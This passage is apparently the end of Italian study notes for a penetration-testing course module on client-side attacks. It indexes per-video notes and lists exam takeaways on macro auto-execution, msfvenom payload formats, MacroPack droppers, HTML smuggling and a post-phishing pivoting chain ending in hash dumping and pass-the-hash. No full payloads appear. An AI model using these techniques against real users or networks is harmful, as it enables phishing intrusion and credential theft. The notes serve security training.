| 10 | Resource Development & Weaponization | MITRE + CKC, methodology | [010_Resource Development & Weaponization.md](../Client-Side%20Attacks/010_Resource%20Development%20&%20Weaponization.md) |
| 11 | VBA Macro Fundamentals | Formati, eventi, WScript | [011_VBA Macro Fundamentals.md](../Client-Side%20Attacks/011_VBA%20Macro%20Fundamentals.md) |
| 12 | VBA Macro Development - Part 1 | Setup IDE, sintassi base | [012_VBA Macro Development - Part 1.md](../Client-Side%20Attacks/012_VBA%20Macro%20Development%20-%20Part%201.md) |
| 13 | VBA Macro Development - Part 2 | Document_Open, AutoOpen, RegRead | [013_VBA Macro Development - Part 2.md](../Client-Side%20Attacks/013_VBA%20Macro%20Development%20-%20Part%202.md) |
| 14 | Weaponizing VBA Macros with MSF | msfvenom -f vba/vba-exe/vba-psh | [014_Weaponizing VBA Macros with MSF.md](../Client-Side%20Attacks/014_Weaponizing%20VBA%20Macros%20with%20MSF.md) |
| 15 | VBA PowerShell Dropper | Invoke-WebRequest + Start-Process | [015_VBA PowerShell Dropper.md](../Client-Side%20Attacks/015_VBA%20PowerShell%20Dropper.md) |
| 16 | VBA Reverse Shell Macro with Powercat | IEX + powercat in-memory | [016_VBA Reverse Shell Macro with Powercat.md](../Client-Side%20Attacks/016_VBA%20Reverse%20Shell%20Macro%20with%20Powercat.md) |
| 17 | Using ActiveX Controls for Macro Execution | InkEdit1_GotFocus | [017_Using ActiveX Controls for Macro Execution.md](../Client-Side%20Attacks/017_Using%20ActiveX%20Controls%20for%20Macro%20Execution.md) |
| 18 | Pretexting Phishing Documents | Cover fake conversion notice | [018_Pretexting Phishing Documents.md](../Client-Side%20Attacks/018_Pretexting%20Phishing%20Documents.md) |
| 19 | HTML Applications (HTA) | mshta.exe + ActiveXObject | [019_HTML Applications (HTA).md](../Client-Side%20Attacks/019_HTML%20Applications%20(HTA).md) |
| 20 | HTA Attacks | msfvenom -f hta-psh + VBA chain | [020_HTA Attacks.md](../Client-Side%20Attacks/020_HTA%20Attacks.md) |
| 21 | Automating Macro Development with MacroPack - Part 1 | Help, flag, primo PoC | [021_Automating Macro Development with MacroPack - Part 1.md](../Client-Side%20Attacks/021_Automating%20Macro%20Development%20with%20MacroPack%20-%20Part%201.md) |
| 22 | Automating Macro Development with MacroPack - Part 2 | Pipeline MSF + dropper templates | [022_Automating Macro Development with MacroPack - Part 2.md](../Client-Side%20Attacks/022_Automating%20Macro%20Development%20with%20MacroPack%20-%20Part%202.md) |
| 23 | File Smuggling with HTML & JavaScript | Blob + URL.createObjectURL | [023_File Smuggling with HTML & JavaScript.md](../Client-Side%20Attacks/023_File%20Smuggling%20with%20HTML%20&%20JavaScript.md) |
| 24 | Initial Access Via Spear Phishing Attachment | Lab end-to-end pivoting | [024_Initial Access Via Spear Phishing Attachment.md](../Client-Side%20Attacks/024_Initial%20Access%20Via%20Spear%20Phishing%20Attachment.md) |
| 25 | Establishing a Shell Through the Victim's Browser | BeEF + Fake Notification Bar | [025_Establishing a Shell Through the Victim's Browser.md](../Client-Side%20Attacks/025_Establishing%20a%20Shell%20Through%20the%20Victim's%20Browser.md) |
| 26 | Course Conclusion | Recap 9 learning objectives | [026_Course Conclusion.md](../Client-Side%20Attacks/026_Course%20Conclusion.md) |

---

## 21. Take-away strategici (top 10 per l'esame)

1. **Pretexting batte la tecnologia**: il payload più sofisticato fallisce se l'email non è credibile.
2. **Metodologia**: Recon → Resource Dev → Weaponization → Delivery → Execution → Post-Ex. È lo schema delle domande "what is the next step".
3. **MITRE TA0042 Resource Development ≠ CKC Weaponization**: il primo è acquisire risorse, il secondo è combinarle in payload.
4. **Gophish 5 building block**: Sending Profile, Landing Page, Email Template, Users & Groups, Campaign.
5. **VBA auto-exec**: `Document_Open` (Word) + `AutoOpen` (legacy) + `Workbook_Open` (Excel). Salvare come `.doc` (97-2003) per OPSEC.
6. **WScript.⁠Shell.Run** signature: `(cmd, windowStyle=0, waitOnReturn=False)` per hidden + fire-and-forget.
7. **msfvenom**: ricorda i formati **vba**, **vba-exe**, **vba-psh**, **hta-psh**. Su Windows usa `-o`, MAI `>`.
8. **MacroPack**: pipeline `echo <input> | macropack.exe -t <template> -o -G <out>`. Template chiave: `cmd`, `dropper`, `dropper_ps`.
9. **HTML Smuggling = T1027.006**: Blob + `<a download>`. **`base64 -w0`** obbligatorio.
10. **Pivoting chain post-phishing**: `autoroute` → `socks_proxy` (9050) → `proxychains nmap -sT -Pn` → `portfwd` → exploit `bind_tcp` → `hash⁠dump` → `psexec` PtH → `enable_rdp`.

### 21.1 Cosa NON è stato coperto a fondo (rimandi)
- **Obfuscation profonda** payload (Invoke-Obfus⁠cation, AMSI bypass moderno) → modulo **PowerShell for Pentesters**.
- **AV evasion** moderna (Donut, ScareCrow, Shellter) → modulo **PowerShell for Pentesters** (Shellter).
- **C2 frameworks** completi (Cobalt Strike, Mythic, Sliver, Havoc) → modulo dedicato **Command & Control (C2)**.
- **Browser exploitation** via CVE specifici → richiede studio CVE-by-CVE separato.

---

> **Fine sintesi modulo Client-Side Attacks.**
> File generato da 26 `.md` sorgente nella cartella `../Client-Side Attacks/`.
> Per dettagli pratici di un singolo video, consultare il `.md` corrispondente linkato nella sezione **Mappa dei video sorgente**.
